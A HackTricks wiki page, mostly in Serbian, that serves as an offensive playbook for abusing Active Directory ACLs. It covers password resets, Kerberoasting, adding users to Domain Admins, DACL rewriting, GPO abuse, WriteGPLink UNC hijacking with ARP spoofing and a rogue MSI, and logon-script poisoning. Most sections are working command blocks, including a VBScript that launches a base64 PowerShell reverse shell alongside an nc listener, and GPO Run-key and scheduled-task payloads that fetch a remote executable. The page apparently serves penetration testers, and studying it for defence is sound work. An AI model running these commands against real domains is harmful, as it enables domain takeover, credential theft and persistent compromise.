# Abuse Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Ova stranica je uglavnom sažetak tehnika iz** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **i** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Za više detalja, pogledajte originalne članke.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Ova privilegija napadaču daje potpunu kontrolu nad ciljnim korisničkim nalogom. Jednom kada se prava `GenericAll` potvrde pomoću komande `Get-ObjectAcl`, napadač može:

- **Promeniti lozinku cilja**: Korišćenjem `net user <username> <password> /domain`, napadač može resetovati lozinku korisnika.
- Sa Linux-a, možete uraditi isto preko SAMR koristeći Samba `net rpc`:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Ako je nalog onemogućen, uklonite UAC flag**: `GenericAll` omogućava uređivanje `userAccountControl`. Sa Linuxa, BloodyAD može ukloniti `ACCOUNTDISABLE` flag:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Dodeli SPN korisničkom nalogu da bi ga učinio pogodnim za kerberoasting, zatim koristi Rubeus i targetedKerberoast.py da izdvojiš i pokušaš da crack-uješ hash-eve ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Onemogućiti pre-autentikaciju za korisnika, čineći njegov nalog ranjivim na ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Sa `GenericAll` na korisniku možete dodati sertifikat-bazirani credential i autentifikovati se kao taj korisnik bez promene njegove lozinke. Pogledajte:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll Rights on Group**

Ova privilegija omogućava napadaču da manipuliše članstvom u grupi ako ima `GenericAll` prava na grupu kao što je `Domain Admins`. Nakon identifikacije distinguished name grupe pomoću `Get-NetGroup`, napadač može:

- **Add Themselves to the Domain Admins Group**: Ovo se može uraditi direktnim komandama ili korišćenjem modula kao što su Active Directory ili PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Sa Linux-a takođe možete koristiti BloodyAD da dodate sebe u proizvoljne grupe kada imate GenericAll/Write membership nad njima. Ako je ciljna grupa ugnježdena u “Remote Management Users”, odmah ćete dobiti WinRM pristup na hostovima koji poštuju tu grupu:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Držanje ovih privilegija nad computer objektom ili user nalogom omogućava:

- **Kerberos Resource-based Constrained Delegation**: Omogućava preuzimanje kontrole nad computer objektom.
- **Shadow Credentials**: Koristi ovu tehniku da se predstaviš kao computer ili user nalog iskorišćavanjem privilegija za kreiranje shadow credentials.

## **WriteProperty on Group**

Ako user ima `WriteProperty` prava nad svim objektima za određenu grupu (npr. `Domain Admins`), može da:

- **Add Themselves to the Domain Admins Group**: Moguće putem kombinovanja `net user` i `Add-NetGroupUser` komandi, ova metoda omogućava privilege escalation unutar domena.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Ova privilegija omogućava napadačima da sami sebe dodaju u određene grupe, kao što je `Domain Admins`, kroz komande koje direktno manipulišu članstvom u grupi. Korišćenje sledećeg niza komandi omogućava samostalno dodavanje:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Slična privilegija, ovo omogućava napadačima da se direktno dodaju u grupe modifikovanjem svojstava grupe ako imaju `WriteProperty` pravo nad tim grupama. Potvrda i izvršenje ove privilegije se obavljaju sa:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Posedovanje `ExtendedRight` nad korisnikom za `User-Force-Change-Password` omogućava resetovanje lozinke bez poznavanja trenutne lozinke. Provera ovog prava i njegovo iskorišćavanje može se obaviti kroz PowerShell ili alternativne command-line alate, nudeći nekoliko metoda za resetovanje lozinke korisnika, uključujući interaktivne sesije i one-linere za neinteraktivna okruženja. Komande se kreću od jednostavnih PowerShell poziva do korišćenja `rpcclient` na Linux-u, demonstrirajući svestranost attack vectors.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

Ako napadač otkrije da ima `WriteOwner` prava nad grupom, može da promeni vlasništvo nad grupom na sebe. Ovo je posebno značajno kada je u pitanju grupa `Domain Admins`, jer promena vlasništva omogućava širu kontrolu nad atributima grupe i članstvom. Proces podrazumeva identifikovanje ispravnog objekta pomoću `Get-ObjectAcl`, a zatim korišćenje `Set-DomainObjectOwner` za izmenu vlasnika, bilo preko SID-a ili imena.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Ova dozvola omogućava napadaču da izmeni svojstva korisnika. Konkretno, sa `GenericWrite` pristupom, napadač može da promeni putanju logon skripte korisnika kako bi se pri prijavi korisnika izvršila zlonamerna skripta. Ovo se postiže korišćenjem komande `Set-ADObject` za ažuriranje svojstva `scriptpath` ciljanog korisnika tako da pokazuje na napadačevu skriptu.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite na Group**

Sa ovim privilegijom, napadači mogu da manipulišu članstvom u grupi, kao što je dodavanje sebe ili drugih korisnika u određene grupe. Ovaj proces uključuje kreiranje credential object, korišćenje njega za dodavanje ili uklanjanje korisnika iz grupe, i proveru promena članstva pomoću PowerShell komandi.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Sa Linuxa, Samba `net` može dodavati/uklanjati članove kada imate `GenericWrite` nad grupom (korisno kada PowerShell/RSAT nisu dostupni):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Posedovanje AD objekta i `WriteDACL` privilegija nad njim omogućava napadaču da sam sebi dodeli `GenericAll` privilegije nad objektom. Ovo se postiže kroz ADSI manipulaciju, što omogućava potpunu kontrolu nad objektom i mogućnost izmene članstva u grupama. Uprkos tome, postoje ograničenja kada se pokušava eksploatacija ovih privilegija pomoću cmdlet-ova `Set-Acl` / `Get-Acl` modula Active Directory.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner brzo preuzimanje (PowerView)

Kada imate `WriteOwner` i `WriteDacl` nad korisnikom ili service account-om, možete preuzeti potpunu kontrolu i resetovati njegovu lozinku koristeći PowerView bez poznavanja stare lozinke:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Napomene:
- Možda će biti potrebno prvo da promeniš owner-a na sebe ako imaš samo `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Validate access with any protocol (SMB/LDAP/RDP/WinRM) after password reset.

## **Replication on the Domain (DCSync)**

DCSync napad koristi specifične permisije za replikaciju na domenu da bi imitirao Domain Controller i sinhronizovao podatke, uključujući korisničke kredencijale. Ova moćna tehnika zahteva permisije kao što je `DS-Replication-Get-Changes`, omogućavajući napadačima da izvuku osetljive informacije iz AD okruženja bez direktnog pristupa Domain Controller-u. [**Saznaj više o DCSync napadu ovde.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Delegated access za upravljanje Group Policy Objects (GPOs) može predstavljati značajne bezbednosne rizike. Na primer, ako je korisniku kao što je `offense\spotless` delegirano GPO management pravo, može imati privilegije kao što su **WriteProperty**, **WriteDacl** i **WriteOwner**. Ove permisije mogu biti abused za zlonamerne svrhe, kao što je identifikovano pomoću PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerate GPO Permissions

Da bi se identifikovali pogrešno konfigurisanI GPOs, PowerSploit cmdlets mogu da se chain-uju. To omogućava otkrivanje GPOs kojima određeni korisnik ima permisije da upravlja: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: Moguće je utvrditi na koje računare se određeni GPO primenjuje, što pomaže u razumevanju obima potencijalnog uticaja. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Da biste videli koje se politike primenjuju na određeni računar, mogu se koristiti komande kao što je `Get-DomainGPO`.

**OUs with a Given Policy Applied**: Identifikovanje organizational units (OUs) pogođenih datom politikom može se uraditi pomoću `Get-DomainOU`.

Takođe možete koristiti alat [**GPOHound**](https://github.com/cogiceo/GPOHound) za enumeraciju GPOs i pronalaženje problema u njima.

### Abuse GPO - New-GPOImmediateTask

Pogrešno konfigurisanI GPOs mogu se iskoristiti za izvršavanje koda, na primer, kreiranjem immediate scheduled task. To se može uraditi da bi se korisnik dodao u lokalnu administratorsku grupu na pogođenim mašinama, što značajno podiže privilegije:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy modul, ako je instaliran, omogućava kreiranje i povezivanje novih GPO-ova, kao i podešavanje preferenci kao što su registry vrednosti za izvršavanje backdoor-a na pogođenim računarima. Ovaj metod zahteva da se GPO ažurira i da se korisnik prijavi na računar radi izvršavanja:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse nudi metod za abuse postojećih GPO-ova dodavanjem zadataka ili izmenom podešavanja bez potrebe da se kreiraju novi GPO-ovi. Ovaj alat zahteva modifikaciju postojećih GPO-ova ili korišćenje RSAT alata za kreiranje novih pre primene promena:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Force Policy Update

GPO updates se obično dešavaju otprilike na svakih 90 minuta. Da bi se ovaj proces ubrzao, posebno nakon primene promene, komanda `gpupdate /force` može se koristiti na ciljnom računaru da bi se prinudilo trenutno ažuriranje politike. Ova komanda obezbeđuje da se sve izmene na GPO-ovima primene bez čekanja na sledeći automatski ciklus ažuriranja.

### Under the Hood

Nakon pregleda Scheduled Tasks za dati GPO, kao što je `Misconfigured Policy`, može se potvrditi dodavanje taskova poput `evilTask`. Ovi taskovi se kreiraju kroz skripte ili command-line alate sa ciljem da izmene ponašanje sistema ili eskaliraju privilegije.

Struktura taska, kao što je prikazano u XML konfiguracionom fajlu generisanom od strane `New-GPOImmediateTask`, prikazuje detalje scheduled taska - uključujući komandu koja će se izvršiti i njene triggere. Ovaj fajl predstavlja kako se scheduled taskovi definišu i upravljaju unutar GPO-ova, pružajući metod za izvršavanje proizvoljnih komandi ili skripti kao deo enforcement-a politike.

### Users and Groups

GPO-ovi takođe omogućavaju manipulaciju članstvima korisnika i grupa na ciljanim sistemima. Direktnim uređivanjem policy fajlova za Users and Groups, napadači mogu dodati korisnike u privilegovane grupe, kao što je lokalna grupa `administrators`. Ovo je moguće zahvaljujući delegaciji GPO management permissions, koja omogućava izmenu policy fajlova kako bi se dodali novi korisnici ili promenila članstva u grupama.

XML konfiguracioni fajl za Users and Groups prikazuje kako se ove promene implementiraju. Dodavanjem unosa u ovaj fajl, određenim korisnicima se mogu dodeliti povišene privilegije na pogođenim sistemima. Ova metoda nudi direktan pristup privilege escalation kroz GPO manipulaciju.

Pored toga, mogu se razmotriti i dodatne metode za izvršavanje koda ili održavanje persistence, kao što su korišćenje logon/logoff skripti, izmena registry ključeva za autoruns, instalacija softvera preko .msi fajlova ili uređivanje service konfiguracija. Ove tehnike pružaju različite načine za održavanje pristupa i kontrolu ciljnih sistema kroz abuse GPO-ova.

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` preko OU/domain omogućava da izmenite `gPLink` atribut ciljnog containera i **prinudite postojeći GPO da se primeni** bez uređivanja samog GPO-a. Ovo postaje zanimljivo kada povezani GPO već referencira remote content preko **UNC paths** (`\\HOST\share\...`), jer authenticated users mogu da čitaju **SYSVOL** i traže reusable policies offline.

Workflow na visokom nivou:

1. Koristite BloodHound da identifikujete principal sa `WriteGPLink` nad OU i da enumerišete računare/korisnike unutar tog OU.
2. Klonirajte `SYSVOL` u read-only režimu i parsirajte GPO-ove tražeći **Software Installation**, **drive mappings** (`Drives.xml`) i **logon/startup scripts** koji referenciraju UNC paths.
3. Prednost dajte policy-jevima koji pokazuju na **direct hostname** (na primer `\\DC02\share\pkg.msi`) umesto na DFS/domain-namespace paths, jer su hostname-based paths lakši za preusmeravanje pomoću L2 spoofing-a.
4. Dodajte izabrani GPO GUID na `gPLink` ciljnog OU-a tako da žrtva procesuira već postojeći policy.
5. Na istom broadcast domain-u, ARP spoof-ujte UNC host i lokalno bind-ujte njegov IP (`ip addr add <target_ip>/32 dev <iface>`) tako da SMB traffic žrtve stigne do vašeg hosta.
6. Servirajte očekivanu putanju/fajl ime sa attacker SMB servera (na primer `smbserver.py`) i sačekajte normalno procesiranje policy-ja.

Primer `SYSVOL` prikupljanja i GPO korelacije:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Povežite postojeći GPO sa ciljnim OU:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Ako povezani GPO deploy-uje MSI sa UNC putanje, klijent će ga preuzeti tokom **computer startup** i instalirati ga kao **`NT AUTHORITY\SYSTEM`**. Lažiranjem referenciranog hosta i serviranjem zlonamernog MSI-ja pod **istim share/path/name**, možeš pretvoriti **WriteGPLink** u SYSTEM code execution **bez menjanja SYSVOL-a**.

Važna ograničenja:

- **Timing matters**: nova veza se vidi pri policy refresh-u (obično ~90 minuta), ali se **Software Installation** uglavnom aktivira tek pri **reboot**.
- Windows Installer obično prati deployment pomoću paketa **`ProductCode`**. Ako je proizvod već instaliran, deployment može biti preskočen.
- Da bi se izbeglo odbijanje instalera, zakrpi rogue MSI tako da njegov **`ProductCode`** i **`PackageCode`** odgovaraju legitimnom paketu koji GPO očekuje.
- Stari `.aas` advertisement fajlovi mogu ostati u `SYSVOL`, pa proveri da li deployment i dalje izgleda aktivno pre nego što se osloniš na njega.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP drive mappings u `Drives.xml` uzrokuju da se korisnici autentifikuju na konfigurisanom UNC putu tokom logon ili ponovnog povezivanja. Ako spoof-ujete referencirani host, možete uhvatiti **NetNTLMv2**. Ako se SMB namerno natera da otkaže, Windows može pokušati preko **WebDAV**, šaljući **NTLM over HTTP**, što je mnogo fleksibilnije za relay ka **LDAP(S)**, **AD CS**, ili **SMB**.

#### Logon/startup script UNC hijack

Isti obrazac važi za UNC-hosted skripte otkrivene u `SYSVOL`:

- **Logon scripts** obično se izvršavaju u **user** kontekstu.
- **Startup scripts** obično se izvršavaju u **computer / SYSTEM** kontekstu.

Ako putanja skripte pokazuje na hostname koji se može spoof-ovati, preusmerite UNC host i servirajte zamenski sadržaj skripte sa očekivane lokacije.

## SYSVOL/NETLOGON Logon Script Poisoning

Writable putanje pod `\\<dc>\SYSVOL\<domain>\scripts\` ili `\\<dc>\NETLOGON\` omogućavaju izmenu logon skripti koje se izvršavaju pri user logonu preko GPO. Ovo omogućava code execution u security kontekstu korisnika koji se prijavljuju.

### Locate logon scripts
- Inspect user attributes for a configured logon script:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Pretraži domain shares da bi otkrio prečice ili reference na skripte:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Parsiraj `.lnk` fajlove da bi rešio targete koji pokazuju na SYSVOL/NETLOGON (koristan DFIR trik i za napadače bez direktnog GPO pristupa):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound prikazuje `logonScript` (scriptPath) atribut na čvorovima korisnika kada je prisutan.

### Validirajte write access (nemojte verovati share listing-ovima)
Automatizovani alati mogu prikazati SYSVOL/NETLOGON kao read-only, ali osnovni NTFS ACL-ovi i dalje mogu dozvoliti writes. Uvek testirajte:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Ako se promeni veličina fajla ili mtime, imate write. Sačuvajte originale pre izmene.

### Poison a VBScript logon script for RCE
Dodajte komandu koja pokreće PowerShell reverse shell (generišite ga sa revshells.com) i zadržite originalnu logiku da ne biste narušili poslovnu funkciju:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Slušajte na svom hostu i sačekajte sledeću interaktivnu prijavu:
```bash
rlwrap -cAr nc -lnvp 443
```
Napomene:
- Izvršavanje se odvija pod tokenom korisnika koji beleži (ne SYSTEM). Opseg je GPO link (OU, site, domain) koji primenjuje taj script.
- Očisti tako što ćeš vratiti originalni sadržaj/timestamp-ove posle upotrebe.


## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
